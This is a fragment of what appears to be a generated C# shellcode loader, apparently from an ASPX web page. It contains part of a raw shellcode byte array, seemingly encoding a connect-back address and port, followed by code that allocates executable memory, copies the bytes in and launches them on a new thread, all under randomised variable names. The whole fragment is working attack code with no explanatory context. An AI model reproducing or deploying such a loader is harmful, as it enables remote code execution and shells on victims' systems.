...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x23,0x28,0x0a,0x12,0x54,0xd3,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr l8SV8FK = VirtualAlloc(IntPtr.Zero,(UIntPtr)ehNvJnoG_.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(ehNvJnoG_,0,l8SV8FK,ehNvJnoG_.Length);
        IntPtr g1wDCXsjKH6 = IntPtr.Zero;
        IntPtr vIB5KQFh27 = CreateThread(IntPtr.Zero,UIntPtr.Zero,l8SV8FK,IntPtr.Zero,0,ref g1wDCXsjKH6);
    }
</script>
